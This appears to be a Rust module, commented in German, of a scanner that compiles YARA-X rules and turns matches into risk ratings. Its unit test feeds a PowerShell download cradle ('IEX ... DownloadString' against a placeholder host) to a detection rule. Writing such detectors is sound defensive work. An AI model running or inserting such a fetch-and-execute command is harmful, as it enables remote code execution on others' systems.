//! YARA-X-Regeln. Eigene Regeln liegen in `rules/yara/aegis-builtin.yar`; fremde Regelsätze
//! nur mit passender Lizenz (Herkunft in `docs/LICENSES.md`).
//!
//! Metadaten je Regel: `severity` (dangerous, risky, game, suspicious, info) und `de`/`en`.

use aegis_core::risk::RiskLevel;

use crate::finding::{Reason, Source, Weight};

/// Die eingebauten AEGIS-Regeln.
pub const BUILTIN_RULES: &str = include_str!("../../../rules/yara/aegis-builtin.yar");

/// Kompilierte Regeln.
pub struct YaraRules {
    rules: yara_x::Rules,
}

impl std::fmt::Debug for YaraRules {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("YaraRules").finish_non_exhaustive()
    }
}

/// Ein Regel-Treffer.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct YaraHit {
    /// Regelname.
    pub rule: String,
    /// Schweregrad aus den Metadaten.
    pub severity: String,
    /// Begründung Deutsch.
    pub de: String,
    /// Begründung Englisch.
    pub en: String,
}

impl YaraRules {
    /// Kompiliert Regelquellen (Name, Text).
    ///
    /// # Errors
    /// Syntaxfehler in einer Regel (mit Name der Quelle).
    pub fn compile<'a>(
        sources: impl IntoIterator<Item = (&'a str, &'a str)>,
    ) -> Result<Self, String> {
        let mut compiler = yara_x::Compiler::new();
        for (name, src) in sources {
            compiler
                .add_source(src)
                .map_err(|e| format!("{name}: {e}"))?;
        }
        Ok(Self {
            rules: compiler.build(),
        })
    }

    /// Nur die eingebauten Regeln.
    ///
    /// # Errors
    /// Sollte nicht vorkommen (Regeln sind getestet).
    pub fn builtin() -> Result<Self, String> {
        Self::compile([("aegis-builtin.yar", BUILTIN_RULES)])
    }

    /// Durchsucht Bytes.
    ///
    /// # Errors
    /// Fehler des Scanners (z. B. Zeitlimit).
    pub fn scan(&self, bytes: &[u8]) -> Result<Vec<YaraHit>, String> {
        let mut scanner = yara_x::Scanner::new(&self.rules);
        scanner.set_timeout(std::time::Duration::from_secs(10));
        let results = scanner.scan(bytes).map_err(|e| e.to_string())?;
        Ok(results
            .matching_rules()
            .map(|rule| {
                let meta = |key: &str| {
                    rule.metadata()
                        .find_map(|(k, v)| match v {
                            yara_x::MetaValue::String(s) if k == key => Some(s.to_owned()),
                            _ => None,
                        })
                        .unwrap_or_default()
                };
                YaraHit {
                    rule: rule.identifier().to_owned(),
                    severity: meta("severity"),
                    de: meta("de"),
                    en: meta("en"),
                }
            })
            .collect())
    }
}

/// Begründung zu einem Treffer.
#[must_use]
pub fn reason(hit: &YaraHit) -> Reason {
    let weight = match hit.severity.as_str() {
        "dangerous" => Weight::Definite(RiskLevel::Dangerous),
        "risky" => Weight::Definite(RiskLevel::RiskyTool),
        "game" => Weight::Definite(RiskLevel::GameTool),
        "suspicious" => Weight::Score(45),
        _ => Weight::Score(10),
    };
    let de = if hit.de.is_empty() {
        format!("YARA-Regel {} trifft zu.", hit.rule)
    } else {
        hit.de.clone()
    };
    let en = if hit.en.is_empty() {
        format!("YARA rule {} matches.", hit.rule)
    } else {
        hit.en.clone()
    };
    Reason::new(
        &format!("yara.{}", hit.rule),
        Source::Yara {
            rule: hit.rule.clone(),
        },
        weight,
        &de,
        &en,
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn eingebaute_regeln_kompilieren_und_treffen() {
        let rules = YaraRules::builtin().unwrap();
        assert!(rules.scan(b"ganz normaler Text").unwrap().is_empty());
        let marker = [
            b"xx AEGIS-HARMLESS-TEST-".as_slice(),
            b"SIGNATURE-DANGEROUS-7c1e xx",
        ]
        .concat();
        let hits = rules.scan(&marker).unwrap();
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].severity, "dangerous");
        assert_eq!(
            reason(&hits[0]).weight,
            Weight::Definite(RiskLevel::Dangerous)
        );
        let cradle = b"IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')";
        let hits = rules.scan(cradle).unwrap();
        assert_eq!(hits[0].rule, "AEGIS_PowerShell_Download_Cradle");
        assert_eq!(reason(&hits[0]).weight, Weight::Score(45));
    }

    #[test]
    fn syntaxfehler_wird_gemeldet() {
        let err = YaraRules::compile([("kaputt.yar", "rule { }")]).unwrap_err();
        assert!(err.starts_with("kaputt.yar:"));
    }
}
